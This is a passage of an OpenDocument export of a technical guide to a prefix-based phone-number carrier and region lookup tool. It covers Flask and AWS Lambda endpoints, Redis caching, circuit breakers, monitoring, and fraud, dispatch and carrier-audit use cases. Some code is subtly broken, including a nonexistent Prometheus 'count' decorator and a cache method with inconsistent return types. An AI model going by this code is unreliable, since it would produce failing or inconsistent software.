      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>phone = data.get('phone_number')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not phone:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return jsonify({'error': 'phone_number required'}), 400</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>result = tracker.track(phone)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not result.valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return jsonify({'error': 'Invalid phone number'}), 400</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>return jsonify(result.to_dict())</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">@app.route('/api/v1/bulk', methods=['POST'])</text:p>
      <text:p text:style-name="Preformatted_20_Text">def bulk_track():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>data = request.get_json()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>numbers = data.get('numbers', [])</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>results = []</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for number in numbers:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>results.append(tracker.track(number).to_dict())</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return jsonify({'results': results})</text:p>
      <text:p text:style-name="Preformatted_20_Text">4.4 Cloud Deployment</text:p>
      <text:p text:style-name="Preformatted_20_Text">Deploy on AWS Lambda for serverless operation:</text:p>
      <text:p text:style-name="Preformatted_20_Text"># AWS Lambda handler</text:p>
      <text:p text:style-name="Preformatted_20_Text">import json</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.core.tracker import PhoneNumberTracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def lambda_handler(event, context):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""AWS Lambda entry point."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Parse request</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>phone = event.get('queryStringParameters', {}).get('phone')</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not phone:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'statusCode': 400,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'body': json.dumps({'error': 'phone parameter required'})</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Track number</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = tracker.track(phone)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not result.valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'statusCode': 400,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'body': json.dumps({'error': 'Invalid phone number'})</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Return response</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'statusCode': 200,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'headers': {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'Content-Type': 'application/json',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'Access-Control-Allow-Origin': '*'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>},</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'body': json.dumps(result.to_dict())</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'statusCode': 500,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'body': json.dumps({'error': str(e)})</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text">5. Advanced Techniques</text:p>
      <text:p text:style-name="Preformatted_20_Text">5.1 Performance Optimization</text:p>
      <text:p text:style-name="Preformatted_20_Text">Caching Strategy:</text:p>
      <text:p text:style-name="Preformatted_20_Text">import redis</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>from functools import lru_cache</text:p>
      <text:p text:style-name="Preformatted_20_Text">import hashlib</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class CachedTracker:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.redis_client = redis.Redis(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>host='localhost',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>port=6379,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>decode_responses=True</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.cache_ttl = 86400 <text:s/># 24 hours</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>@lru_cache(maxsize=1000)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def track_with_memory_cache(self, phone):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""L1 cache: in-memory LRU cache."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return self.tracker.track(phone)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def track_with_redis(self, phone):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""L2 cache: distributed Redis cache."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Create cache key</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>cache_key = f"phone:{hashlib.md5(phone.encode()).hexdigest()}"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Check Redis</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>cached = self.redis_client.get(cache_key)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if cached:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>import json</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return json.loads(cached)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Track and cache</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = self.tracker.track(phone)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if result.valid:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.redis_client.setex(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>cache_key,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.cache_ttl,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>json.dumps(result.to_dict())</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return result</text:p>
      <text:p text:style-name="Preformatted_20_Text">Batch Processing Optimization:</text:p>
      <text:p text:style-name="Preformatted_20_Text">def batch_track_optimized(phone_numbers, batch_size=100):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Process multiple phone numbers efficiently.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Uses connection pooling and parallel requests.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>from concurrent.futures import ThreadPoolExecutor, as_completed</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>results = []</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>with ThreadPoolExecutor(max_workers=10) as executor:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Submit all tasks</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>future_to_number = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>executor.submit(tracker.track, number): number </text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>for number in phone_numbers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Collect results as they complete</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for future in as_completed(future_to_number):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="12"/>number = future_to_number[future]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>result = future.result(timeout=5)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>results.append(result)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>logger.error(f"Error tracking {number}: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>results.append(None)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return results</text:p>
      <text:p text:style-name="Preformatted_20_Text">5.2 Scaling Architecture</text:p>
      <text:p text:style-name="Preformatted_20_Text">For high-volume production use (millions of lookups per day):</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>Load Balancer │</text:p>
      <text:p text:style-name="Preformatted_20_Text">└────────┬────────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="9"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>┌────┴────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s text:c="8"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌───▼───┐ ┌───▼───┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ API <text:s text:c="2"/>│ │ API <text:s text:c="2"/>│ ... Auto-scaling group</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ Node 1│ │ Node 2│</text:p>
      <text:p text:style-name="Preformatted_20_Text">└───┬───┘ └───┬───┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s text:c="8"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└────┬────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="9"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>┌────▼────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s/>Redis <text:s/>│ Distributed cache</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ Cluster │</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└────┬────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="9"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>┌────▼────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│PostgreSQL│ Historical data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s/>RDS <text:s text:c="3"/>│ &amp; analytics</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└─────────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text">5.3 Fault Tolerance</text:p>
      <text:p text:style-name="Preformatted_20_Text">Implement circuit breakers for external API calls:</text:p>
      <text:p text:style-name="Preformatted_20_Text">import time</text:p>
      <text:p text:style-name="Preformatted_20_Text">from functools import wraps</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">class CircuitBreaker:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Circuit breaker pattern for external API calls."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self, failure_threshold=5, recovery_timeout=60):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.failure_threshold = failure_threshold</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.recovery_timeout = recovery_timeout</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.failure_count = 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.last_failure_time = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.state = 'CLOSED' <text:s/># CLOSED, OPEN, HALF_OPEN</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def call(self, func, *args, **kwargs):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if self.state == 'OPEN':</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if time.time() - self.last_failure_time &gt; self.recovery_timeout:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.state = 'HALF_OPEN'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>raise Exception("Circuit breaker is OPEN")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result = func(*args, **kwargs)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if self.state == 'HALF_OPEN':</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="16"/>self.state = 'CLOSED'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.failure_count = 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return result</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.failure_count += 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.last_failure_time = time.time()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if self.failure_count &gt;= self.failure_threshold:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.state = 'OPEN'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>raise e</text:p>
      <text:p text:style-name="Preformatted_20_Text">5.4 Monitoring and Observability</text:p>
      <text:p text:style-name="Preformatted_20_Text">import prometheus_client</text:p>
      <text:p text:style-name="Preformatted_20_Text">from prometheus_client import Counter, Histogram, Gauge</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Metrics</text:p>
      <text:p text:style-name="Preformatted_20_Text">track_requests = Counter('phone_track_requests_total', 'Total tracking requests')</text:p>
      <text:p text:style-name="Preformatted_20_Text">track_duration = Histogram('phone_track_duration_seconds', 'Tracking duration')</text:p>
      <text:p text:style-name="Preformatted_20_Text">track_errors = Counter('phone_track_errors_total', 'Tracking errors')</text:p>
      <text:p text:style-name="Preformatted_20_Text">active_lookups = Gauge('phone_active_lookups', 'Active lookups')</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">@track_duration.time()</text:p>
      <text:p text:style-name="Preformatted_20_Text">@track_requests.count()</text:p>
      <text:p text:style-name="Preformatted_20_Text">def monitored_track(phone):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>with active_lookups.track_inprogress():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return tracker.track(phone)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>track_errors.inc()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>raise</text:p>
      <text:p text:style-name="Preformatted_20_Text">6. Real-World Use Cases</text:p>
      <text:p text:style-name="Preformatted_20_Text">6.1 E-commerce Fraud Detection</text:p>
      <text:p text:style-name="Preformatted_20_Text">A major African e-commerce platform uses phone number geolocation to detect fraudulent orders:</text:p>
      <text:p text:style-name="Preformatted_20_Text">def evaluate_order_risk(order):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Evaluate order risk based on phone number location."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>phone_info = tracker.track(order.phone_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>risk_score = 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Check if phone country matches shipping country</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if phone_info.country_name != order.shipping_country:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>risk_score += 30</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>logger.warning(f"Country mismatch: phone={phone_info.country_name}, shipping={order.shipping_country}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Check if carrier is known prepaid (higher risk)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>high_risk_carriers = ['virtual', 'prepaid', 'mvno']</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if phone_info.carrier_name and any(c in phone_info.carrier_name.lower() for c in high_risk_carriers):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>risk_score += 20</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Check if location matches IP geolocation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>ip_country = geolocate_ip(order.ip_address)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if phone_info.country_name != ip_country:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>risk_score += 15</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'risk_score': risk_score,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'high_risk': risk_score &gt; 50,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'phone_info': phone_info.to_dict()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text">6.2 Emergency Services Routing</text:p>
      <text:p text:style-name="Preformatted_20_Text">A Tanzanian emergency response system uses prefix-based routing:</text:p>
      <text:p text:style-name="Preformatted_20_Text">def route_emergency_call(phone_number):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Route emergency call to appropriate local dispatch."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>info = tracker.track(phone_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Extract region from location</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>location = info.location or info.country_name</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Map to dispatch center</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>dispatch_centers = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"Dar es Salaam": "disp-01.dar.esb",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"Arusha": "disp-02.arusha.esb",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"Mwanza": "disp-03.mwanza.esb",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"Zanzibar": "disp-04.zanzibar.esb",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"DEFAULT": "disp-00.national.esb"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Find closest match</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>center = dispatch_centers.get(location)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not center:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Try partial matching</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for key, value in dispatch_centers.items():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if key in location:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>center = value</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>break</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'dispatch_center': center or dispatch_centers['DEFAULT'],</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'phone_info': info.to_dict()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text">6.3 Telecommunications Regulatory Compliance</text:p>
      <text:p text:style-name="Preformatted_20_Text">A regulatory body audits carrier allocations:</text:p>
      <text:p text:style-name="Preformatted_20_Text">def audit_carrier_allocations():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Verify carriers are using allocated prefixes correctly."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Official allocations from TCRA</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>official = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'74': 'Vodacom',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'75': 'Vodacom',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'76': 'Vodacom',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'68': 'Airtel',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'69': 'Airtel',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'78': 'Airtel',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'65': 'tiGO',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'67': 'tiGO',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'71': 'tiGO',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'77': 'tiGO',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'61': 'halotel',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'62': 'halotel',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>'73': 'TTCL',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Sample numbers from each prefix</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>test_numbers = [f"+255{prefix}0000001" for prefix in official.keys()]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>results = {}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>for number in test_numbers:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>info = tracker.track(number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>prefix = number[5:7] <text:s/># Extract prefix</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>results[prefix] = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'detected': info.carrier_name,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'official': official.get(prefix),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'match': info.carrier_name == official.get(prefix)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
